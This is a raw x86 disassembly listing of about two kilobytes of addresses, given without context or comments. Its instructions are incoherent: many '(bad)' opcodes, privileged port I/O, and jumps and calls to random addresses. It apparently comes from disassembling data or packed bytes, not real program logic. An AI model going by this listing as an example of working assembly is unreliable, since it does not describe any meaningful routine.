  416175:	and    BYTE PTR [edi-0x206c18b6],ch
  41617b:	mov    ds:0x59812470,al
  416180:	cmp    bh,BYTE PTR [ecx-0x1909994f]
  416186:	pop    es
  416187:	repz std 
  416189:	dec    ebp
  41618a:	mov    bh,0x6f
  41618c:	jbe    0x41613f
  41618e:	and    DWORD PTR [ebp-0x13],edi
  416191:	xchg   edx,eax
  416192:	sub    al,0xb4
  416194:	xor    bl,ch
  416196:	cld    
  416197:	ret    0x1ae5
  41619a:	ins    BYTE PTR es:[edi],dx
  41619b:	adc    al,0x2c
  41619d:	out    0x20,al
  41619f:	in     al,0x69
  4161a1:	fwait
  4161a2:	popa   
  4161a3:	xor    eax,0x49b30af7
  4161a8:	ds cmp cl,BYTE PTR ds:[edx+ebx*8]
  4161ad:	fcmovnbe st,st(0)
  4161af:	sti    
  4161b0:	stos   BYTE PTR es:[edi],al
  4161b1:	call   FWORD PTR [ecx]
  4161b3:	xchg   DWORD PTR [ecx+eax*8-0x505293f5],ebx
  4161ba:	sub    cl,ch
  4161bc:	shr    eax,1
  4161be:	push   ds
  4161bf:	mov    esi,0x9cb69800
  4161c4:	push   edx
  4161c5:	in     eax,0xe6
  4161c7:	aaa    
  4161c8:	mov    ebx,0x725ab5fb
  4161cd:	outs   dx,BYTE PTR ds:[esi]
  4161ce:	stos   BYTE PTR es:[edi],al
  4161cf:	loopne 0x41621e
  4161d1:	out    dx,eax
  4161d2:	adc    DWORD PTR [ecx-0x7044eddc],0x75
  4161d9:	shl    DWORD PTR [esi-0x798b88ad],1
  4161df:	mov    gs,eax
  4161e1:	fidiv  DWORD PTR [edx-0x49]
  4161e4:	xchg   esi,eax
  4161e5:	pop    ds
  4161e6:	jecxz  0x416263
  4161e8:	or     DWORD PTR [edi+0x72],edi
  4161eb:	xor    al,0x59
  4161ed:	rcr    DWORD PTR [ecx-0x3f],cl
  4161f0:	lods   al,BYTE PTR ds:[esi]
  4161f1:	mul    BYTE PTR [ebp+0x51]
  4161f4:	in     eax,dx
  4161f5:	retf   0xcd90
  4161f8:	cmp    cl,BYTE PTR [edi+ebp*8+0x39]
  4161fc:	cli    
  4161fd:	retf   
  4161fe:	push   ebx
  4161ff:	in     eax,dx
  416200:	inc    ebx
  416201:	aad    0x50
  416203:	dec    edx
  416204:	jecxz  0x4161ca
  416206:	es inc eax
  416208:	into   
  416209:	je     0x4161b8
  41620b:	lods   eax,DWORD PTR ds:[esi]
  41620c:	repnz xchg ebp,eax
  41620e:	call   0x320c1350
  416213:	bnd call 0x1876eac5
  416219:	mov    ebp,0xa6429a80
  41621e:	imul   ecx,DWORD PTR [edx-0x698f19e4],0xfffffff6
  416225:	jmp    0xfe02:0x653d9825
  41622c:	or     ecx,esi
  41622e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41622f:	div    esp
  416231:	lods   al,BYTE PTR ds:[esi]
  416232:	les    ebp,FWORD PTR [edx-0x7e]
  416235:	adc    eax,0x73ea51e6
  41623a:	imul   edx,DWORD PTR [edi+0x58],0xffffffb5
  41623e:	or     DWORD PTR [eax-0x4a],ecx
  416241:	push   0x65
  416243:	mov    esp,DWORD PTR [esi]
  416245:	in     eax,0xcc
  416247:	jbe    0x41629c
  416249:	out    dx,al
  41624a:	fistp  DWORD PTR [ebp+0xbe61e2c]
  416250:	sub    edx,edi
  416252:	pop    ebp
  416253:	sbb    DWORD PTR [ebx+0x7da0613b],edx
  416259:	int    0x5f
  41625b:	jns    0x4161ea
  41625d:	push   ds
  41625e:	xor    eax,0xbf61d9fc
  416263:	repnz ss retf 
  416266:	mov    edx,0xff738248
  41626b:	fcom   QWORD PTR [ecx]
  41626d:	sti    
  41626e:	sub    ebx,DWORD PTR [eax]
  416270:	ins    DWORD PTR es:[edi],dx
  416271:	lahf   
  416272:	outs   dx,BYTE PTR ds:[esi]
  416273:	add    ah,BYTE PTR [edi-0x30]
  416276:	mov    ds:0xb6dd4b5,al
  41627b:	jns    0x4162d7
  41627d:	adc    DWORD PTR [ebp-0x250ab86f],0xb
  416284:	stos   BYTE PTR es:[edi],al
  416285:	sub    DWORD PTR [eax+0x268adc6e],edx
  41628b:	dec    edi
  41628c:	test   al,0xe1
  41628e:	mov    cl,0x22
  416290:	popa   
  416291:	jb     0x41628f
  416293:	xchg   ebp,eax
  416294:	hlt    
  416295:	jg     0x4162e4
  416297:	fwait
  416298:	mov    eax,0x816f31a9
  41629d:	cmp    ebx,DWORD PTR [edi]
  41629f:	dec    esi
  4162a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4162a1:	and    ecx,ecx
  4162a3:	xor    dh,BYTE PTR [eax-0x68]
  4162a6:	dec    esp
  4162a7:	mov    cl,0x8d
  4162a9:	add    eax,0x525759ec
  4162ae:	xchg   DWORD PTR [esi-0x72],eax
  4162b1:	lea    eax,[esi]
  4162b3:	sahf   
  4162b4:	scas   al,BYTE PTR es:[edi]
  4162b5:	mov    al,ds:0x78d0fa3e
  4162ba:	pop    ecx
  4162bb:	mov    eax,0x457a03a8
  4162c0:	test   al,0x65
  4162c2:	add    ecx,ebx
  4162c4:	adc    ebp,edi
  4162c6:	add    al,0xc7
  4162c8:	adc    BYTE PTR [edx-0x15],bl
  4162cb:	ror    DWORD PTR [ebx-0x3077d590],0x28
  4162d2:	test   DWORD PTR [edx-0x23],esp
  4162d5:	xor    ebp,DWORD PTR [edi+ebp*2+0x37]
  4162d9:	xchg   BYTE PTR [edx-0x71],dl
  4162dc:	mov    ds:0x3880394c,al
  4162e1:	and    bh,cl
  4162e3:	sar    ch,1
  4162e5:	jp     0x4162f1
  4162e7:	and    edx,esp
  4162e9:	les    ebx,FWORD PTR [ebp+0x58983c0]
  4162ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162f0:	mov    dh,0xf6
  4162f2:	adc    bl,0x78
  4162f5:	and    dl,BYTE PTR [ebx-0x4a]
  4162f8:	rep ins BYTE PTR es:[edi],dx
  4162fa:	stc    
  4162fb:	(bad)  
  4162fc:	mov    cs,edi
  4162fe:	in     eax,dx
  4162ff:	js     0x4162d9
  416301:	fsubr  st(0),st
  416303:	repnz fs cmc 
  416306:	(bad)  
  416307:	imul   eax,DWORD PTR [ebp+0x69fb0dc6],0xffffffd2
  41630e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41630f:	dec    ebp
  416310:	mov    esp,DWORD PTR [edi-0x33]
  416313:	shr    DWORD PTR [edi+eiz*8],1
  416316:	les    eax,FWORD PTR [edi-0x58]
  416319:	mov    ah,0x72
  41631b:	test   al,0x9b
  41631d:	ret    
  41631e:	inc    ecx
  41631f:	jmp    0xebbf:0x6931d3f7
  416326:	cmp    ecx,edx
  416328:	sub    al,0x8
  41632a:	jecxz  0x416323
  41632c:	(bad)  
  41632d:	mov    eax,ds:0x87384e4b
  416332:	mov    ebx,0x710a9ca5
  416337:	cmp    dl,BYTE PTR [edx-0x76606404]
  41633d:	cmp    esi,DWORD PTR [ecx+esi*4+0x3f32c753]
  416344:	loop   0x4163c1
  416346:	pop    edx
  416347:	movntq QWORD PTR [eax+0x6f],mm3
  41634b:	in     al,0xee
  41634d:	push   0xffffffde
  41634f:	xor    BYTE PTR [edx+0x7e],cl
  416352:	repnz or ecx,DWORD PTR [ebp-0x124b28e3]
  416359:	push   ebp
  41635a:	mov    esi,0x92b6adde
  41635f:	push   es
  416360:	cmc    
  416361:	adc    al,0xe7
  416363:	(bad)
  41636a:	jnp    0x41635d
  41636c:	pop    ebx
  41636d:	fcom   DWORD PTR [ebp+0x7368787d]
  416373:	push   0x5acea86b
  416378:	imul   esi,DWORD PTR [edx+0x1e],0x34
  41637c:	(bad)  
  41637d:	jp     0x41635e
  41637f:	cmp    DWORD PTR [edx+0x18665d3e],ebx
  416385:	add    BYTE PTR [edx-0x16],ch
  416388:	xlat   BYTE PTR ds:[ebx]
  416389:	arpl   WORD PTR [esi-0x78],cx
  41638c:	jne    0x41630e
  41638e:	jns    0x416374
  416390:	mov    al,ds:0x4ccc9344
  416395:	out    dx,al
  416396:	cdq    
  416397:	repz add ebx,eax
  41639a:	fcmovnb st,st(2)
  41639c:	not    BYTE PTR [ecx-0x17]
  41639f:	add    eax,0x51f0973c
  4163a4:	jae    0x4163dd
  4163a6:	or     eax,0x4976af92
  4163ab:	mov    esi,0xb2f8dc3
  4163b0:	pop    es
  4163b1:	add    al,0xd9
  4163b3:	fwait
  4163b4:	loope  0x416370
  4163b6:	xchg   edx,eax
  4163b7:	jge    0x41636a
  4163b9:	cs push edi
  4163bb:	fmul   st(0),st
  4163bd:	xchg   edi,eax
  4163be:	lods   al,BYTE PTR ds:[esi]
  4163bf:	xchg   BYTE PTR [ebp+0x41dbbceb],dl
  4163c5:	loop   0x416382
  4163c7:	push   esp
  4163c8:	out    dx,al
  4163c9:	in     al,dx
  4163ca:	shl    BYTE PTR [eax],0xb7
  4163cd:	push   ebp
  4163ce:	dec    esp
  4163cf:	sbb    DWORD PTR [ebx-0x23],eax
  4163d2:	xchg   DWORD PTR ds:0xbca2caa4,edi
  4163d8:	fiadd  DWORD PTR [ebx+0x116b21b9]
  4163de:	pop    ds
  4163df:	arpl   WORD PTR [ecx+0x3294a921],si
  4163e5:	jnp    0x416367
  4163e7:	hlt    
  4163e8:	mov    dl,0xd
  4163ea:	add    ebx,DWORD PTR [esi+0x7c]
  4163ed:	fwait
  4163ee:	shr    BYTE PTR [ecx],1
  4163f0:	mov    dl,0x2c
  4163f2:	scas   eax,DWORD PTR es:[edi]
  4163f3:	or     BYTE PTR [edx+0x4],al
  4163f6:	gs cld 
  4163f8:	jg     0x4163a3
  4163fa:	iret   
  4163fb:	(bad)  
  4163fc:	xchg   edx,eax
  4163fd:	pop    es
  4163fe:	and    cl,0xe8
  416401:	mov    ebp,DWORD PTR [edx-0x5df2a59b]
  416407:	cmp    DWORD PTR [edi+0x508384f8],eax
  41640d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41640e:	iret   
  41640f:	sbb    ch,ch
  416411:	inc    esi
  416412:	jno    0x41645f
  416414:	mov    WORD PTR [eax+ecx*8+0x6311393a],?
  41641b:	inc    ebx
  41641c:	pop    ecx
  41641d:	daa    
  41641e:	xchg   esi,eax
  41641f:	mov    ss,WORD PTR [ecx]
  416421:	dec    edi
  416422:	ins    DWORD PTR es:[edi],dx
  416423:	in     eax,dx
  416424:	imul   eax,DWORD PTR [esi-0x5d],0x10
  416428:	sbb    al,ah
  41642a:	mov    DWORD PTR ds:0x16976be4,esp
  416430:	or     al,0x68
  416432:	push   eax
  416433:	add    eax,0xd5bef212
  416438:	call   0xf63b:0x246f827c
  41643f:	cmc    
  416440:	stc    
  416441:	dec    ebp
  416442:	test   eax,0x1e4bdbb7
  416447:	xor    DWORD PTR [eax-0x313a2f48],ebx
  41644d:	xchg   esp,eax
  41644e:	cmp    DWORD PTR [esi],ebp
  416450:	mov    dl,0x6f
  416452:	add    bl,BYTE PTR [eax+0x53c172eb]
  416458:	jge    0x4163df
  41645a:	aad    0xb9
  41645c:	pop    eax
  41645d:	jg     0x4164d0
  41645f:	icebp  
  416460:	dec    ebp
  416461:	shl    DWORD PTR [esi-0x4a],0x5b
  416465:	dec    edi
  416466:	push   esp
  416467:	add    ch,BYTE PTR [edx-0xe]
  41646a:	(bad)  
  41646b:	pop    ds
  41646c:	call   0x21e0:0x9638df9c
  416473:	es push ss
  416475:	mov    esi,0xa8f1f00c
  41647a:	jnp    0x41647e
  41647c:	jmp    0x25b85c58
  416481:	sub    esp,ebp
  416483:	jne    0x416471
  416485:	add    DWORD PTR ds:0xd5045db6,0x895c071c
  41648f:	(bad)  
  416490:	or     eax,0x79047325
  416495:	add    esi,DWORD PTR [esi-0x29]
  416498:	sub    dh,bl
  41649a:	fadd   QWORD PTR [edi+0x4e]
  41649d:	cmp    BYTE PTR [ecx-0x1296ac43],bl
  4164a3:	aaa    
  4164a4:	mov    ?,WORD PTR [esp+ecx*8-0x1f]
  4164a8:	mov    ebp,0x9f5934db
  4164ad:	lods   eax,DWORD PTR ds:[esi]
  4164ae:	or     dh,cl
  4164b0:	mov    ebx,0x2e5442c1
  4164b5:	pop    esi
  4164b6:	or     eax,0xa2cc8557
  4164bb:	mov    ah,0xe5
  4164bd:	(bad)  
  4164be:	retf   
  4164bf:	hlt    
  4164c0:	cwde   
  4164c1:	ins    DWORD PTR es:[edi],dx
  4164c2:	test   eax,0xb24396a7
  4164c7:	test   eax,0x8eca01c0
  4164cc:	inc    ebp
  4164cd:	cmp    DWORD PTR [ebx],esi
  4164cf:	shr    DWORD PTR [ebp+0x56],cl
  4164d2:	retf   0xd58
  4164d5:	jne    0x416515
  4164d7:	call   0x4b2d494c
  4164dc:	inc    ebp
  4164dd:	sbb    cl,dl
  4164df:	lods   al,BYTE PTR ds:[esi]
  4164e0:	mov    al,ds:0x5857d891
  4164e5:	lahf   
  4164e6:	std    
  4164e7:	add    ebx,edi
  4164e9:	mov    al,ds:0x50ac53fd
  4164ee:	retf   
  4164ef:	mov    BYTE PTR [ebp+edi*1+0x3796d463],cl
  4164f6:	test   al,0xd9
  4164f8:	sbb    esi,DWORD PTR [ecx+0x7e]
  4164fb:	ins    DWORD PTR es:[edi],dx
  4164fc:	adc    ah,BYTE PTR [ecx+0x2e]
  4164ff:	mov    ds:0x1d1fdabb,al
  416504:	jmp    0xee20830
  416509:	or     ebx,DWORD PTR [ecx+0x64]
  41650c:	fcompp 
  41650e:	into   
  41650f:	loop   0x416585
  416511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416512:	or     ebx,ebx
  416514:	iret   
  416515:	mov    edi,0xb3ff1d81
  41651a:	in     al,0x22
  41651c:	add    ecx,DWORD PTR [edi+0x4b85160]
  416522:	lahf   
  416523:	lods   eax,DWORD PTR ds:[esi]
  416524:	mov    ebx,0x3be11d53
  416529:	jno    0x41653c
  41652b:	inc    edx
  41652c:	jno    0x416539
  41652e:	inc    esi
  41652f:	jmp    0xbf55:0xb0d1e3d
  416536:	adc    DWORD PTR [edi+eax*2+0x35],edi
  41653a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41653b:	jo     0x416560
  41653d:	jb     0x416539
  41653f:	fidiv  DWORD PTR [ecx-0x72]
  416542:	test   BYTE PTR [eax],cl
  416544:	add    BYTE PTR ds:0x71cfa4d8,0xa1
  41654b:	xor    al,0x6a
  41654d:	sbb    ch,cl
  41654f:	dec    eax
  416550:	xor    ah,BYTE PTR [ecx+0x76a450ec]
  416556:	in     eax,dx
  416557:	mov    dl,0x6
  416559:	pop    ecx
  41655a:	cmp    esi,DWORD PTR [edi-0x1b]
  41655d:	dec    BYTE PTR [eax-0x3fbf2ced]
  416563:	gs adc cl,ah
  416566:	push   ss
  416567:	lods   al,BYTE PTR ds:[esi]
  416568:	inc    edx
  416569:	sub    dh,BYTE PTR [ebp-0x6cf08461]
  41656f:	jbe    0x4164f5
  416571:	ret    0x9695
  416574:	jmp    0xe80c463d
  416579:	imul   esp,DWORD PTR [eax],0x604fbf04
  41657f:	inc    edi
  416580:	mov    BYTE PTR [esi-0x17],cl
  416583:	push   0xffffffbc
  416585:	es daa 
  416587:	xchg   esp,eax
  416588:	inc    eax
  416589:	and    eax,0x50d3164b
  41658e:	jmp    0xdb2e0cdc
  416593:	dec    ebx
  416594:	sub    DWORD PTR [ebp+ebp*8-0xf],ecx
  416598:	cmp    eax,0x2497c649
  41659d:	call   0x78fe:0xfa29a338
  4165a4:	int    0x3e
  4165a6:	jnp    0x4165ec
  4165a8:	add    edx,DWORD PTR [edi+0x56cabbf9]
  4165ae:	cmp    BYTE PTR [edx],0xa5
  4165b1:	mov    bl,0xf9
  4165b3:	sub    eax,0x66616af2
  4165b8:	adc    al,0xfc
  4165ba:	mov    eax,edx
  4165bc:	fs jnp 0x416626
  4165bf:	xchg   ebx,eax
  4165c0:	jecxz  0x416624
  4165c2:	push   esp
  4165c3:	xchg   ebp,eax
  4165c4:	cli    
  4165c5:	imul   esp,DWORD PTR [eax+0x67e0c730],0x40
  4165cc:	sbb    eax,DWORD PTR [ecx]
  4165ce:	scas   eax,DWORD PTR es:[edi]
  4165cf:	mov    eax,ds:0x6c54c176
  4165d4:	jecxz  0x416619
  4165d6:	test   al,0x74
  4165d8:	adc    eax,0x1b79bb56
  4165dd:	or     al,0xe2
  4165df:	es out 0x52,al
  4165e2:	mov    BYTE PTR [esi+0x46],ah
  4165e5:	(bad)  
  4165e6:	mov    esp,0x80775fdf
  4165eb:	(bad)  
  4165ec:	in     al,dx
  4165ed:	mov    ch,0xad
  4165ef:	pop    eax
  4165f0:	mov    ds:0xaa27d23b,eax
  4165f5:	test   BYTE PTR [esi],ch
  4165f7:	jbe    0x41661f
  4165f9:	call   0x18c4f308
  4165fe:	stos   BYTE PTR es:[edi],al
  4165ff:	xchg   esi,eax
  416600:	xchg   dh,dh
  416602:	stos   DWORD PTR es:[edi],eax
  416603:	mov    edi,0x98902144
  416608:	std    
  416609:	in     eax,dx
  41660a:	dec    ecx
  41660b:	pop    esi
  41660c:	adc    DWORD PTR [ebx-0x63],edx
  41660f:	scas   al,BYTE PTR es:[edi]
  416610:	cli    
  416611:	lar    esi,WORD PTR [ebx]
  416614:	mov    ?,WORD PTR [edi-0x22c94967]
  41661a:	mov    ds:0x20a00ea7,al
  41661f:	mov    ecx,0x567b687c
  416624:	retf   
  416625:	or     al,0x3b
  416627:	cmp    ebx,DWORD PTR [ebp-0x35ca955e]
  41662d:	xchg   ecx,eax
  41662e:	inc    edx
  41662f:	bound  ebx,QWORD PTR [ecx]
  416631:	sbb    al,0x44
  416633:	dec    si
  416635:	outs   dx,DWORD PTR ds:[esi]
  416636:	std    
  416637:	sbb    al,0x8
  416639:	and    eax,0x8a2f89d7
  41663e:	out    dx,al
  41663f:	cdq    
  416640:	add    eax,0xb1d0c655
  416645:	mov    ds:0x61dd230d,eax
  41664a:	xchg   ebx,eax
  41664b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41664c:	dec    esi
  41664d:	scas   eax,DWORD PTR es:[edi]
  41664e:	out    dx,al
  41664f:	xchg   ecx,eax
  416650:	loop   0x4165de
  416652:	jl     0x4166b6
  416654:	pop    ecx
  416655:	inc    ebx
  416656:	les    edx,FWORD PTR ds:0xf7dd37f9
  41665c:	cmp    eax,0x52222f01
  416661:	fadd   QWORD PTR [esi-0x4eb73c6]
  416667:	js     0x416600
  416669:	and    eax,0xd7add95a
  41666e:	sbb    ebx,DWORD PTR [ebp-0x43]
  416671:	and    BYTE PTR [edi+0x2e],bh
  416674:	pop    ebp
  416675:	xlat   BYTE PTR ds:[ebx]
  416676:	mov    ch,0xb4
  416678:	pushf  
  416679:	lahf   
  41667a:	mov    eax,0xb0425a8
  41667f:	and    edi,DWORD PTR [edx]
  416681:	aad    0x1d
  416683:	dec    esi
  416684:	sbb    DWORD PTR [eax+0x47cf7d8b],0xffffff83
  41668b:	imul   esp,esi,0xffffffb2
  41668e:	mov    ecx,0xfee0cd5a
  416693:	sbb    dl,al
  416695:	cmp    BYTE PTR [ecx+ebx*2+0x14267c23],bh
  41669c:	xor    eax,0x2a42ed48
  4166a1:	jecxz  0x4166cf
  4166a3:	sbb    DWORD PTR [edi+0x25],ebx
  4166a6:	scas   al,BYTE PTR es:[edi]
  4166a7:	add    DWORD PTR [esi+0x7c09ef4b],ebx
  4166ad:	(bad)  
  4166ae:	in     eax,dx
  4166af:	mov    eax,0x576e8522
  4166b4:	rol    ebp,cl
  4166b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4166b7:	xor    cl,BYTE PTR [edx-0x42]
  4166ba:	or     al,0xd0
  4166bc:	mov    eax,ds:0xd9bec9b7
  4166c1:	jne    0x416672
  4166c3:	fxam   
  4166c5:	mov    ebp,0xde38bbaf
  4166ca:	inc    edi
  4166cb:	popf   
  4166cc:	fisub  WORD PTR [ebx+eiz*1-0x296e52f0]
  4166d3:	out    dx,eax
  4166d4:	pop    esp
  4166d5:	int    0xcf
  4166d7:	mov    ebp,0xe327ef3
  4166dc:	jae    0x41674b
  4166de:	xchg   edx,eax
  4166df:	lahf   
  4166e0:	or     BYTE PTR [edx],dl
  4166e2:	sahf   
  4166e3:	sbb    dh,BYTE PTR ds:0x4fab7e20
  4166e9:	or     ecx,DWORD PTR [eax+0x54]
  4166ec:	ds xor eax,0xa91197e6
  4166f2:	aas    
  4166f3:	jae    0x41667f
  4166f5:	push   es
  4166f6:	stos   BYTE PTR es:[edi],al
  4166f7:	es pop edi
  4166f9:	scas   eax,DWORD PTR es:[edi]
  4166fa:	add    BYTE PTR [ebx],0xcc
  4166fd:	cdq    
  4166fe:	add    ecx,DWORD PTR [edx-0x10e576bb]
  416704:	es mov cl,0xd3
  416707:	rcl    BYTE PTR [edx+0x14ed11ba],0xa1
  41670e:	add    DWORD PTR [edx+0xc46a684],ecx
  416714:	int    0x29
  416716:	repnz inc ecx
  416718:	push   esi
  416719:	mov    ah,0x28
  41671b:	aaa    
  41671c:	mov    cl,0xd5
  41671e:	jne    0x416727
  416720:	push   esi
  416721:	xchg   ebx,eax
  416722:	mov    edx,0xc247dd6f
  416727:	outs   dx,BYTE PTR ds:[esi]
  416728:	hlt    
  416729:	in     eax,dx
  41672a:	stc    
  41672b:	cmp    ebp,DWORD PTR [edi-0x2f2c90b6]
  416731:	(bad)  
  416732:	mov    ecx,0x1d57a32e
  416737:	scas   al,BYTE PTR es:[edi]
  416738:	ja     0x416726
  41673a:	xchg   ecx,eax
  41673b:	mov    edi,0x77316391
  416740:	cmp    al,0xdd
  416742:	jp     0x416792
  416744:	xor    eax,0x775b2616
  416749:	stc    
  41674a:	outs   dx,DWORD PTR ds:[esi]
  41674b:	leave  
  41674c:	imul   edx,DWORD PTR [eax-0x5077a46a],0x6473d84d
  416756:	je     0x416758
  416758:	mov    ah,0x59
  41675a:	mov    ebx,0xa233cbfb
  41675f:	and    al,dh
  416761:	inc    ecx
  416762:	imul   ecx,ebp,0xffffffee
  416765:	(bad)  
  416766:	cld    
  416767:	lock (bad) 
  416769:	inc    DWORD PTR [ebx+ebp*4-0x45]
  41676d:	pusha  
  41676e:	sub    eax,0xefd26cec
  416773:	xchg   DWORD PTR [edi],edx
  416775:	in     eax,dx
  416776:	cdq    
  416777:	mov    ch,0xb0
  416779:	adc    eax,0x76fb7bd3
  41677e:	int3   
  41677f:	xor    BYTE PTR [ebp+0x15],cl
  416782:	rol    DWORD PTR [ebp-0x62cc6167],0x14
  416789:	adc    BYTE PTR [esi-0x2df3445e],0x71
  416790:	mov    al,0xcb
  416792:	jmp    0x4167f5
  416794:	jbe    0x416735
  416796:	gs sar dl,cl
  416799:	repnz scas al,BYTE PTR es:[edi]
  41679b:	pop    ebx
  41679c:	pop    edi
  41679d:	and    BYTE PTR [ebx],dh
  41679f:	sbb    dh,BYTE PTR [edi+0x4d]
  4167a2:	dec    DWORD PTR [eax]
  4167a4:	in     al,0xec
  4167a6:	xor    ebx,edx
  4167a8:	cli    
  4167a9:	jmp    0x416781
  4167ab:	lock retf 0xef3f
  4167af:	es std 
  4167b1:	pop    ss
  4167b2:	or     dl,dh
  4167b4:	and    esp,DWORD PTR [edx+0x6ca44c47]
  4167ba:	jg     0x416797
  4167bc:	mov    edi,DWORD PTR [ecx+0x44]
  4167bf:	push   eax
  4167c0:	pop    ebp
  4167c1:	inc    eax
  4167c2:	retf   0xa7a9
  4167c5:	mov    dl,0xde
  4167c7:	dec    ebp
  4167c8:	adc    ch,BYTE PTR [esi+eax*1]
  4167cb:	fdiv   st(6),st
  4167cd:	jmp    0x4167d8
  4167cf:	in     eax,0x32
  4167d1:	sub    ebx,eax
  4167d3:	imul   BYTE PTR [esi+ebx*2-0x8]
  4167d7:	mov    al,0x6
  4167d9:	pop    es
  4167da:	mov    ah,0xa9
  4167dc:	pushf  
  4167dd:	pop    edx
  4167de:	call   0xcaff6072
  4167e3:	mov    ecx,0x337ee988
  4167e8:	xor    ecx,esi
  4167ea:	not    BYTE PTR ds:0xd6c00cc
  4167f0:	pop    esp
  4167f1:	sbb    al,0xfe
  4167f3:	cmovne edx,DWORD PTR [eax]
  4167f6:	add    eax,0x1270cf38
  4167fb:	ss mov al,0x8b
  4167fe:	and    eax,0x8a3c363b
  416803:	and    DWORD PTR [esp+eax*8],eax
  416806:	out    dx,al
  416807:	or     esp,DWORD PTR [eax]
  416809:	leave  
  41680a:	(bad)  
  41680b:	neg    DWORD PTR [ecx+0x33]
  41680e:	shr    edx,0x15
  416811:	aam    0xcb
  416813:	sbb    DWORD PTR [esi],0xba361ac7
  416819:	test   BYTE PTR [ebp-0x28cced4],ah
  41681f:	lar    ebx,WORD PTR [ebp-0x50]
  416823:	or     al,0x88
  416825:	jnp    0x416870
  416827:	mov    edi,0xc6895da6
  41682c:	pop    edx
  41682d:	xor    al,0x4c
  41682f:	or     ecx,DWORD PTR [ecx]
  416831:	out    0x42,al
  416833:	and    BYTE PTR [edi+0xe],bl
  416836:	es in  al,0x6
  416839:	sbb    ebx,DWORD PTR [edx-0x44]
  41683c:	outs   dx,BYTE PTR ds:[esi]
  41683d:	mov    esp,0x94e30bcf
  416842:	sbb    al,0xac
  416844:	in     eax,dx
  416845:	pop    esp
  416846:	fldcw  WORD PTR [eax-0x497f7fa6]
  41684c:	ror    BYTE PTR [esi],0x21
  41684f:	shl    BYTE PTR [eax+ecx*2+0x50],cl
  416853:	cmp    edi,DWORD PTR [ecx+esi*8]
  416856:	imul   eax,DWORD PTR [ebx],0x71
  416859:	adc    al,0xb1
  41685b:	jmp    0x87df157a
  416860:	loope  0x41687f
  416862:	mov    ds:0x2e759be3,eax
  416867:	enter  0x830d,0x91
  41686b:	or     ebp,ebx
  41686d:	ret    
  41686e:	repz retf 
  416870:	mov    DWORD PTR [edi-0x4c2623b8],esi
  416876:	sub    bl,BYTE PTR [eax]
  416878:	cld    
  416879:	js     0x4168c5
  41687b:	out    dx,eax
  41687c:	pop    esp
  41687d:	pusha  
  41687e:	sbb    al,0x76
  416880:	jno    0x4168a1
  416882:	cld    
  416883:	mov    eax,0xfd75e710
  416888:	cwde   
  416889:	mov    esi,0xba8a30c7
  41688e:	mov    ch,0xb7
  416890:	jnp    0x41681b
  416892:	push   ecx
  416893:	and    bh,BYTE PTR [ecx+0x610366ce]
  416899:	enter  0xe85b,0x12
  41689d:	cmp    DWORD PTR [edi-0x6e8ba86c],0x76
  4168a4:	xchg   DWORD PTR [ebp-0x50],edx
  4168a7:	jecxz  0x4168bd
  4168a9:	(bad)  
  4168aa:	outs   dx,BYTE PTR ds:[esi]
  4168ab:	daa    
  4168ac:	dec    DWORD PTR [ecx+ecx*4+0x55]
  4168b0:	test   al,0x8b
  4168b2:	push   ebp
  4168b3:	or     BYTE PTR [ebx-0x3d7e53a3],cl
  4168b9:	xchg   ebx,eax
  4168ba:	clc    
  4168bb:	add    BYTE PTR fs:[ebx],cl
  4168be:	ror    DWORD PTR [ecx+0x558bac55],cl
  4168c4:	or     cl,ch
  4168c6:	pushf  
  4168c7:	and    eax,DWORD PTR [eax]
  4168c9:	add    BYTE PTR [edi+0x65],dl
  4168cc:	stos   DWORD PTR es:[edi],eax
  4168cd:	cwde   
  4168ce:	jnp    0x416868
  4168d0:	inc    edi
  4168d1:	jns    0x4168fa
  4168d3:	in     eax,dx
  4168d4:	fistp  DWORD PTR [eax-0x4b]
  4168d7:	cmp    eax,0x3bbe0a85
  4168dc:	jge    0x416958
  4168de:	(bad)  
  4168df:	pop    edi
  4168e0:	jp     0x41695c
  4168e2:	cmp    BYTE PTR [eax+0x34de7924],0x48
  4168e9:	in     al,dx
  4168ea:	jp     0x416919
  4168ec:	les    ebx,FWORD PTR [ebx]
  4168ee:	outs   dx,BYTE PTR ds:[esi]
  4168ef:	fisub  DWORD PTR [ecx-0x18dff410]
  4168f5:	jbe    0x416908
  4168f7:	dec    ebp
  4168f8:	pop    ebx
  4168fa:	nop
  4168fb:	lock stc 
  4168fd:	xchg   DWORD PTR [edi+0x403e1239],ebp
  416903:	repz or eax,0xff82158a
  416909:	xor    al,BYTE PTR [ecx]
  41690b:	fidivr WORD PTR [edx+ebp*4-0x46d76e94]
  416912:	retf   
  416913:	sti    
  416914:	inc    eax
  416915:	fcmovbe st,st(1)
  416917:	mov    bh,BYTE PTR [ecx-0x573bf246]
  41691d:	hlt    
  41691e:	xchg   BYTE PTR [eax],dl
  416920:	popfw  
  416922:	mov    BYTE PTR [ebx-0xa],ch
  416925:	inc    ecx
  416926:	jb     0x4168f0
  416928:	xlat   BYTE PTR fs:[ebx]
  41692a:	arpl   WORD PTR [ecx+0x31e837b1],dx
  416930:	int3   
  416931:	call   0xce66d235
  416936:	lods   al,BYTE PTR ds:[esi]
  416937:	inc    esp
  416938:	cmp    DWORD PTR [edx-0x1312734c],0x3f
  41693f:	cli    
  416940:	lods   al,BYTE PTR ds:[esi]
  416941:	dec    esp
  416942:	jo     0x416982
  416944:	out    0xf7,al
  416946:	shl    DWORD PTR [ebx-0x37],1
  416949:	ret    
  41694a:	dec    al
  41694c:	popf   
  41694d:	cmp    ah,ah
  41694f:	in     eax,0x7a
  416951:	mov    BYTE PTR [esi+0x58],dh
  416954:	mov    ebp,0x485975d7
  416959:	es ins BYTE PTR es:[edi],dx
  41695b:	lock out dx,al
  41695d:	shl    BYTE PTR [ebx+0x61314a64],1
  416963:	xchg   esi,eax
  416964:	clc    
  416965:	jl     0x41693d
  416967:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416968:	(bad)  
  416969:	fstp   QWORD PTR [ebx]
  41696b:	lock add eax,DWORD PTR [ebp+0x43]
